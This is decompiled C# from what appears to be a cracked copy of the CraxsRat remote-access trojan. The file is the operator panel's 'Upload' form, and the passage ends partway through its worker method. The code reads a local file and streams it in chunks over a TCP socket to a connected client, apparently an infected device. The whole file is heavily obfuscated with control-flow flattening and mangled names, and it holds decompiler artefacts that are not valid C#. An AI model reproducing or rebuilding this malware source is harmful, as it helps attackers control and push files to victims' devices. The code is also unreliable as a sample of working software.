// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Upload
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using dummy_ptr;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Upload : Form
  {
    internal Exception \u0024VB\u0024ResumableLocal_ex\u0024478;
    internal int \u0024S479;
    internal int \u0024VB\u0024ResumableLocal_vul0\u0024480;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u0024481;
    internal string[] \u0024VB\u0024ResumableLocal_modes\u0024482;
    internal string \u0024VB\u0024ResumableLocal_getmode\u0024483;
    internal string[] \u0024S484;
    internal int \u0024S485;
    internal string \u0024VB\u0024ResumableLocal_m\u0024486;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u0024487;
    internal string[] \u0024VB\u0024ResumableLocal_modeWiFi\u0024488;
    internal string \u0024VB\u0024ResumableLocal_getmodeWIFI\u0024489;
    internal string[] \u0024S490;
    internal int \u0024S491;
    internal string \u0024VB\u0024ResumableLocal_m\u0024492;
    internal Exception \u0024VB\u0024ResumableLocal_ex\u0024493;
    internal IEnumerator<DataGridView> \u0024S494;
    internal DataGridView \u0024VB\u0024ResumableLocal_gr\u0024495;
    internal int \u0024S496;
    internal int \u0024VB\u0024ResumableLocal_i\u0024497;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).components = (IContainer) new System.ComponentModel.Container();
      DataGridViewCellStyle gridViewCellStyle1 = new DataGridViewCellStyle();
label_1:
      int num1 = 1042244833;
      DataGridViewCellStyle gridViewCellStyle2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(~num1 * -1739672313 * 1495097485) ^ 1687307202 ^ -795211550)) % 45U)
        {
          case 0:
            this.DGV0.Columns.AddRange((DataGridViewColumn) this.Column1, (DataGridViewColumn) this.Column6);
            num1 = (int) num2 * -222617243 ^ 484237687;
            continue;
          case 1:
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle2.BackColor = Color.Black;
            num1 = (int) num2 * -1800865902 ^ 1521460992;
            continue;
          case 2:
            gridViewCellStyle1.Font = new Font(EXGuarder.\u0033C66463E, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            gridViewCellStyle1.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 563906964 ^ -113549741;
            continue;
          case 3:
            this.ProgressBar1.Size = new Size(537, 10);
            num1 = (int) num2 * -584300453 ^ 461672894;
            continue;
          case 4:
            this.DGV0.DefaultCellStyle = gridViewCellStyle2;
            num1 = (int) num2 * 1280853687 ^ 1001434449;
            continue;
          case 5:
            gridViewCellStyle1.BackColor = Color.Black;
            num1 = (int) num2 * -2100719897 ^ 1839279507;
            continue;
          case 6:
            this.Column6.SortMode = DataGridViewColumnSortMode.NotSortable;
            num1 = (int) num2 * -129078332 ^ -2118741269;
            continue;
          case 7:
            this.DGV0 = new DataGridView();
            num1 = (int) num2 * -1232205015 ^ -844991317;
            continue;
          case 8:
            this.Name = EXGuarder.\u003090F692F;
            this.Opacity = 0.0;
            num1 = (int) num2 * -973807224 ^ 1464492993;
            continue;
          case 9:
            goto label_1;
          case 10:
            this.TOpacity.Interval = 1;
            num1 = (int) num2 * 367453147 ^ 1599503017;
            continue;
          case 11:
            this.ProgressBar1 = new ProgressBar();
            num1 = (int) num2 * -163450766 ^ 482716216;
            continue;
          case 12:
            this.DGV0.GridColor = Color.FromArgb(42, 42, 42);
            this.DGV0.Location = new Point(0, 0);
            this.DGV0.Name = EXGuarder.\u0036A475D15;
            num1 = (int) num2 * 781233618 ^ 1226733428;
            continue;
          case 13:
            this.DGV0.EnableHeadersVisualStyles = false;
            num1 = (int) num2 * -218188003 ^ -36633135;
            continue;
          case 14:
            this.DGV0.AllowUserToDeleteRows = false;
            this.DGV0.AllowUserToResizeColumns = false;
            this.DGV0.AllowUserToResizeRows = false;
            this.DGV0.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
            this.DGV0.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            this.DGV0.BackgroundColor = Color.Black;
            this.DGV0.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * 1793534116 ^ 431866561;
            continue;
          case 15:
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(537, 128);
            this.Controls.Add((Control) this.DGV0);
            this.Controls.Add((Control) this.ProgressBar1);
            num1 = (int) num2 * -550163407 ^ 1839003692;
            continue;
          case 16:
            this.ProgressBar1.Location = new Point(0, 118);
            this.ProgressBar1.Name = EXGuarder.\u0036C3E3B1E;
            num1 = (int) num2 * 1020209250 ^ -1977322287;
            continue;
          case 17:
            gridViewCellStyle2.SelectionForeColor = Color.Black;
            num1 = (int) num2 * 1756214603 ^ -2059164053;
            continue;
          case 18:
            gridViewCellStyle2 = new DataGridViewCellStyle();
            num1 = (int) num2 * -1466573250 ^ -1715875790;
            continue;
          case 19:
            this.DGV0.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            this.DGV0.Size = new Size(537, 118);
            num1 = (int) num2 * -1196214767 ^ -2052932241;
            continue;
          case 20:
            this.DGV0.EditMode = DataGridViewEditMode.EditProgrammatically;
            num1 = (int) num2 * -1565312177 ^ 80388908;
            continue;
          case 21:
            this.DGV0.Dock = DockStyle.Fill;
            num1 = (int) num2 * 1736275250 ^ 465522437;
            continue;
          case 22:
            this.Column6 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -2037328885 ^ 24362506;
            continue;
          case 23:
            this.DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
            this.DGV0.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            gridViewCellStyle1.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * -379596792 ^ 304430070;
            continue;
          case 25:
            gridViewCellStyle2.Font = new Font(EXGuarder.\u0033C66463E, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 1045462085 ^ 51805711;
            continue;
          case 26:
            gridViewCellStyle1.SelectionBackColor = SystemColors.Highlight;
            gridViewCellStyle1.SelectionForeColor = SystemColors.HighlightText;
            num1 = (int) num2 * -2068377116 ^ 1104675814;
            continue;
          case 27:
            this.DGV0.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            this.DGV0.RowHeadersVisible = false;
            num1 = (int) num2 * -1812009853 ^ 1035278871;
            continue;
          case 28:
            gridViewCellStyle1.WrapMode = DataGridViewTriState.True;
            num1 = (int) num2 * -1100647859 ^ -1227767840;
            continue;
          case 29:
            this.TOpacity = new System.Windows.Forms.Timer(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).components);
            ((ISupportInitialize) this.DGV0).BeginInit();
            this.SuspendLayout();
            this.DGV0.AllowUserToAddRows = false;
            num1 = (int) num2 * -1138311306 ^ 521294169;
            continue;
          case 30:
            this.Column1 = new DataGridViewTextBoxColumn();
            num1 = (int) num2 * -390819926 ^ -284514481;
            continue;
          case 31:
            this.Column1.SortMode = DataGridViewColumnSortMode.NotSortable;
            this.Column1.Width = 32;
            this.Column6.HeaderText = EXGuarder.\u003070E0260;
            this.Column6.Name = EXGuarder.\u00335651614;
            num1 = (int) num2 * 420130190 ^ 1154227180;
            continue;
          case 32:
            this.ProgressBar1.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 30392778 ^ 819527232;
            continue;
          case 33:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            num1 = (int) num2 * -1860951334 ^ -1668699391;
            continue;
          case 34:
            this.DGV0.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            num1 = (int) num2 * 1658054491 ^ -2037471679;
            continue;
          case 35:
            this.TimeFinish = new System.Windows.Forms.Timer(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).components);
            this.Progr = new System.Windows.Forms.Timer(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).components);
            num1 = (int) num2 * -983018076 ^ 1959958431;
            continue;
          case 36:
            this.DGV0.TabIndex = 6;
            num1 = (int) num2 * 857019353 ^ -1407931796;
            continue;
          case 37:
            this.ProgressBar1.TabIndex = 5;
            num1 = (int) num2 * -210465385 ^ 1924510849;
            continue;
          case 38:
            this.Column1.HeaderText = EXGuarder.\u0030B027100;
            num1 = (int) num2 * 1374774030 ^ 1869034401;
            continue;
          case 39:
            this.Column6.Width = 15;
            num1 = (int) num2 * -1880067845 ^ 186601989;
            continue;
          case 40:
            this.Text = EXGuarder.\u003090F692F;
            ((ISupportInitialize) this.DGV0).EndInit();
            num1 = (int) num2 * -306330136 ^ -1334638306;
            continue;
          case 41:
            gridViewCellStyle2.WrapMode = DataGridViewTriState.False;
            num1 = (int) num2 * 1461850578 ^ -1655041254;
            continue;
          case 42:
            this.DGV0.ColumnHeadersDefaultCellStyle = gridViewCellStyle1;
            num1 = (int) num2 * -1866636681 ^ -1143221234;
            continue;
          case 43:
            gridViewCellStyle2.ForeColor = Color.FromArgb(190, 190, 190);
            gridViewCellStyle2.SelectionBackColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * -765572640 ^ 1766968874;
            continue;
          case 44:
            this.Column1.Name = EXGuarder.\u003513F5340;
            num1 = (int) num2 * 877311338 ^ -225518630;
            continue;
          default:
            goto label_46;
        }
      }
label_46:
      this.ResumeLayout(false);
    }

    internal virtual DataGridView DGV0
    {
      get => ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._DGV0 = value;
      }
    }

    internal virtual ProgressBar ProgressBar1
    {
      get
      {
        return ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._ProgressBar1;
      }
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._ProgressBar1 = value;
      }
    }

    internal virtual System.Windows.Forms.Timer TimeFinish
    {
      get
      {
        return ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TimeFinish;
      }
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TimeFinish_Tick);
        System.Windows.Forms.Timer timeFinish = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TimeFinish;
label_1:
        int num1 = -1790594811;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 ^ -~(-2037463358 * -1912420343)) - -~(1296753135 * 1758857578) * -1083912689 - ~(1065531401 + 251567036) * 550151445)) % 8U)
          {
            case 0:
              timeFinish.Tick += eventHandler;
              num1 = (int) num2 * -1552333164 ^ -1869136911;
              continue;
            case 1:
              timeFinish.Tick -= eventHandler;
              num1 = (int) num2 * 1740347086 ^ -1050212816;
              continue;
            case 2:
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TimeFinish = value;
              num1 = 1013094547;
              continue;
            case 3:
              int num3 = timeFinish == null ? 1470988439 : (num3 = -1773956626);
              num1 = num3 ^ (int) num2 * 808424731;
              continue;
            case 4:
              int num4 = timeFinish == null ? -1975777587 : (num4 = -65554540);
              num1 = num4 ^ (int) num2 * 1177339589;
              continue;
            case 5:
              timeFinish = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TimeFinish;
              num1 = (int) num2 * 1995398770 ^ -507632722;
              continue;
            case 6:
              goto label_1;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual System.Windows.Forms.Timer Progr
    {
      get => ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Progr;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Progr_Tick);
label_1:
        int num1 = -471318523;
        System.Windows.Forms.Timer progr;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-((-(num1 * -267067843) ^ -1945674566) - ~~-799959846) ^ -459990095)) % 9U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = progr == null ? 1536667198 : (num3 = -1653882267);
              num1 = num3 ^ (int) num2 * 1056404080;
              continue;
            case 2:
              progr.Tick += eventHandler;
              num1 = (int) num2 * 52247499 ^ 554698114;
              continue;
            case 3:
              int num4 = progr == null ? 674703369 : (num4 = -1351341959);
              num1 = num4 ^ (int) num2 * -528057148;
              continue;
            case 4:
              goto label_1;
            case 5:
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Progr = value;
              num1 = 1545134250;
              continue;
            case 6:
              progr.Tick -= eventHandler;
              num1 = (int) num2 * -1018887579 ^ -810397247;
              continue;
            case 7:
              progr = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Progr;
              num1 = (int) num2 * 836177458 ^ 993116783;
              continue;
            case 8:
              progr = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Progr;
              num1 = (int) num2 * -2072320119 ^ -540945419;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column1
    {
      get => ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column1 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column6
    {
      get => ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Column6 = value;
      }
    }

    internal virtual System.Windows.Forms.Timer TOpacity
    {
      get
      {
        return ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TOpacity;
      }
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = -135582555;
        System.Windows.Forms.Timer topacity;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(num1 - -1556761665 * ((~1781170003 - 235222777) * 801135831 - (--1610038370 + -1448745081 - ~(1194951389 - 1638146900))) + (-233827971 * -(-1573868535 * 718480298) - -(-195563254 - (-837158909 - -522390228)))) - -(291297798 - 1770357176) ^ 385095048 * -1488237543) - -32788965)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              topacity = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TOpacity;
              int num3 = topacity == null ? 2065303684 : (num3 = -829067857);
              num1 = num3 ^ (int) num2 * 461704453;
              continue;
            case 2:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * -447349143 ^ 1987308387;
              continue;
            case 3:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * -415974428 ^ -309657666;
              continue;
            case 4:
              goto label_3;
            case 5:
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TOpacity = value;
              topacity = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._TOpacity;
              int num4;
              num1 = num4 = topacity == null ? 661803234 : (num4 = -158378327);
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public virtual BackgroundWorker Bgworker
    {
      get
      {
        return ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Bgworker;
      }
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.worker_DoWork);
label_1:
        int num1 = 870150387;
        BackgroundWorker bgworker;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-(-(num1 - (972184122 + 117814651 * -932162450 - -741959483 * (615193023 * -747240025) ^ -((-799655054 ^ -1918093719) - -1620429562) ^ ~(-1738402245 - 1108912049 - 1696874883 * (1268119226 - 1648673054)))) * 1298323891) * 694369379)) % 6U)
          {
            case 0:
              bgworker.DoWork += workEventHandler;
              num1 = (int) num2 * 798549855 ^ 1244665489;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Bgworker = value;
              bgworker = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Bgworker;
              int num3;
              num1 = num3 = bgworker == null ? 735249913 : (num3 = -1692600542);
              continue;
            case 4:
              bgworker.DoWork -= workEventHandler;
              num1 = (int) num2 * 2082795451 ^ 1696672183;
              continue;
            case 5:
              bgworker = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._Bgworker;
              int num4 = bgworker == null ? 297334686 : (num4 = -1345625905);
              num1 = num4 ^ (int) num2 * 108327669;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    private void SpyStyle()
    {
      IEnumerator<DataGridView> enumerator;
      try
      {
        enumerator = this.Controls.OfType<DataGridView>().GetEnumerator();
label_1:
        int num1 = 2073043880;
        DataGridView current;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~-(-num1 + ~(~-2016584224 ^ (1738542758 - -1180300431) * 1196381997))) % 10U)
          {
            case 0:
              goto label_1;
            case 1:
              current.DefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              current.DefaultCellStyle.SelectionBackColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num2 * -1388227692 ^ -298714460;
              continue;
            case 2:
              int num3;
              num1 = num3 = enumerator.MoveNext() ? -2065990805 : (num3 = 1234554445);
              continue;
            case 3:
              goto label_15;
            case 4:
              current.ColumnHeadersDefaultCellStyle.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = (int) num2 * 496658580 ^ 1574336570;
              continue;
            case 5:
              current.BackgroundColor = Settings.DefaultColor_Background;
              current.BackColor = Settings.DefaultColor_Background;
              num1 = (int) num2 * 47413642 ^ 516240031;
              continue;
            case 6:
              current.DefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              current.DefaultCellStyle.SelectionForeColor = Settings.DefaultColor_Background;
              num1 = (int) num2 * 1740142487 ^ 1018055243;
              continue;
            case 7:
              current = enumerator.Current;
              num1 = 2070248243;
              continue;
            case 8:
              num1 = (int) num2 * 1802327903 ^ -230221630;
              continue;
            case 9:
              current.ColumnHeadersDefaultCellStyle.BackColor = Settings.DefaultColor_Background;
              num1 = (int) num2 * 262022538 ^ -674877510;
              continue;
            default:
              goto label_11;
          }
        }
label_15:
        return;
label_11:;
      }
      finally
      {
        if (enumerator != null)
        {
label_13:
          int num4 = 1337072615;
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) ~-(-num4 + ~(~-2016584224 ^ (1738542758 - -1180300431) * 1196381997))) % 3U)
            {
              case 0:
                goto label_13;
              case 1:
                enumerator.Dispose();
                num4 = (int) num5 * 906083542 ^ 804632711;
                continue;
              default:
                goto label_17;
            }
          }
        }
label_17:;
      }
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_6;
label_1:
      int num1 = 153738836;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(~(-num1 ^ ~1697154672) - (~585049410 - (1874574299 - 2123860794))) ^ 576020632)) % 5U)
        {
          case 0:
            goto label_6;
          case 1:
            num1 = (int) num2 * -784821113 ^ 23588468;
            continue;
          case 2:
            this.Opacity += 0.1;
            num1 = (int) num2 * 1952543190 ^ 1202909105;
            continue;
          case 3:
            goto label_1;
          case 4:
            goto label_3;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_6:
      this.TOpacity.Enabled = false;
      num1 = 1039060039;
      goto label_2;
    }

    private void Upload_Load(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0031F305C19);
label_1:
      int num1 = -664889809;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-((~num1 ^ 279956185 - (--188618966 ^ -663477863 ^ 650653173) + (-1709239757 - -594147877 - -1518406491 + (~-1662967455 - (1906111314 - 1264487355)))) * -1204202749) + (1305234619 + 1074408134) ^ -189978842)) % 20U)
        {
          case 0:
            ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream.Close();
            num1 = (int) num2 * -1932407391 ^ 1180310304;
            continue;
          case 1:
            this.Bgworker.RunWorkerAsync();
            num1 = (int) num2 * 837480854 ^ -1551574418;
            continue;
          case 2:
            this.TimeFinish.Interval = 100;
            num1 = (int) num2 * 894560079 ^ -343573640;
            continue;
          case 3:
            this.DGV0.ColumnHeadersDefaultCellStyle.Font = Settings.f;
            num1 = (int) num2 * 175122987 ^ 605213771;
            continue;
          case 4:
            ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream = new FileStream(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).SPL[3], FileMode.Open, FileAccess.Read);
            num1 = (int) num2 * 140041279 ^ 1721717189;
            continue;
          case 5:
            this.Close();
            num1 = (int) num2 * -1113401471 ^ -326144735;
            continue;
          case 6:
            int num3 = !(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream == null & ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).Upstream == 0L) ? -803399451 : (num3 = 1325739311);
            num1 = num3 ^ (int) num2 * -2019092676;
            continue;
          case 7:
            this.Bgworker = new BackgroundWorker();
            num1 = (int) num2 * -2099021430 ^ -296230769;
            continue;
          case 8:
            ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream.Dispose();
            num1 = (int) num2 * -936307007 ^ -67900617;
            continue;
          case 9:
            this.TOpacity.Interval = Settings.T_Interval;
            this.TOpacity.Enabled = true;
            num1 = (int) num2 * 948576682 ^ 68743000;
            continue;
          case 10:
            int num4;
            num1 = num4 = this.Bgworker.IsBusy ? -90496199 : (num4 = -1814760616);
            continue;
          case 11:
            goto label_3;
          case 12:
            this.SpyStyle();
            num1 = (int) num2 * 491019575 ^ -1318133250;
            continue;
          case 13:
            ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).classClient.Close(((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).Client);
            num1 = 830324912;
            continue;
          case 14:
            int num5;
            num1 = num5 = this.Bgworker != null ? -1568332559 : (num5 = 1224490498);
            continue;
          case 15:
            this.TimeFinish.Enabled = true;
            num1 = (int) num2 * 465821768 ^ -906125939;
            continue;
          case 16:
            goto label_1;
          case 17:
            this.Progr.Interval = 10;
            this.Progr.Enabled = true;
            this.Text = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).Title;
            num1 = 182272980;
            continue;
          case 18:
            int num6;
            num1 = num6 = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream == null ? 1192806228 : (num6 = 798818755);
            continue;
          case 19:
            this.DGV0.DefaultCellStyle.Font = Settings.f;
            num1 = (int) num2 * -408435213 ^ -1688413952;
            continue;
          default:
            goto label_22;
        }
      }
label_3:
      return;
label_22:;
    }

    private void worker_DoWork(object sender, DoWorkEventArgs e)
    {
      byte[] numArray = new byte[4097];
label_1:
      int num1 = -1513444142;
      while (true)
      {
        int num2 = num1;
        uint num3;
        int size;
        int num4;
        switch ((num3 = (uint) ((~((-1903010808 ^ -1579561107 ^ -1304150299) - ~(num2 - (-(1498028923 - 1690827984 - -1889355328) - 283229969 * ((283713263 ^ -1691386545) * 163663887) + (((1650363858 ^ 297148319) + 1260956797 * 1039756728) * -1310771753 + ~(2107812723 + 1911481606) * -167020405)))) + (-470091882 ^ -139167909)) * 1434358155)) % 5U)
        {
          case 1:
label_5:
            Thread.Sleep(1);
            if (size <= 0)
            {
              num1 = -1124193117;
              continue;
            }
            goto case 3;
          case 2:
            if (((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream != null)
            {
              num1 = (int) num3 * -1249757254 ^ -1335197591;
              continue;
            }
            goto default;
          case 3:
label_20:
            size = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream.Read(numArray, 0, numArray.Length);
            if (size > 0)
            {
              num4 = 1884587345;
              break;
            }
            goto case 1;
          case 4:
            goto label_1;
          default:
label_24:
            num4 = ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).FileStream == null ? 268760153 : (num4 = 518979040);
            break;
        }
        while (true)
        {
          int num5 = num4;
          uint num6;
          switch ((num6 = (uint) ((~((-1903010808 ^ -1579561107 ^ -1304150299) - ~(num5 - (-(1498028923 - 1690827984 - -1889355328) - 283229969 * ((283713263 ^ -1691386545) * 163663887) + (((1650363858 ^ 297148319) + 1260956797 * 1039756728) * -1310771753 + ~(2107812723 + 1911481606) * -167020405)))) + (-470091882 ^ -139167909)) * 1434358155)) % 7U)
          {
            case 0:
              try
              {
                if (((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).Client.Client.Connected)
                {
label_8:
                  int num7 = -65286262;
                  while (true)
                  {
                    int num8 = num7;
                    uint num9;
                    switch ((num9 = (uint) ((~((-1903010808 ^ -1579561107 ^ -1304150299) - ~(num8 - (-(1498028923 - 1690827984 - -1889355328) - 283229969 * ((283713263 ^ -1691386545) * 163663887) + (((1650363858 ^ 297148319) + 1260956797 * 1039756728) * -1310771753 + ~(2107812723 + 1911481606) * -167020405)))) + (-470091882 ^ -139167909)) * 1434358155)) % 6U)
                    {
                      case 0:
                        // ISSUE: variable of a reference type
                        long& local1;
                        // ISSUE: explicit reference operation
                        long num10 = checked (^(local1 = ref ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).Upstream) + (long) numArray.Length);
                        local1 = num10;
                        num7 = (int) num9 * 1682965298 ^ 1603896665;
                        continue;
                      case 1:
                        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).Client.Client.Poll(RegistryHandler.Microseconds, SelectMode.SelectWrite);
                        num7 = (int) num9 * -1569877368 ^ -574788614;
                        continue;
                      case 2:
                        goto label_8;
                      case 3:
                        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).Client.Client.SendBufferSize = numArray.Length;
                        ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).Client.GetStream().Write(numArray, 0, size);
                        // ISSUE: variable of a reference type
                        long& local2;
                        // ISSUE: explicit reference operation
                        long num11 = checked (^(local2 = ref ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this)._stream) + (long) size);
                        local2 = num11;
                        num7 = (int) num9 * 116226285 ^ -1614445492;
                        continue;
                      case 4:
                        // ISSUE: variable of a reference type
                        long& local3;
                        // ISSUE: reference to a compiler-generated field
                        // ISSUE: explicit reference operation
                        long num12 = checked (^(local3 = ref ((Data) ((Data._Closure\u0024__) ((\u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D) this).classClient).MyServer).BytesSent) + (long) numArray.Length);
                        local3 = num12;
                        num7 = (int) num9 * -1240842034 ^ 819719956;
                        continue;
                      default:
                        goto label_15;
                    }
                  }
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                goto label_24;
              }
label_15:
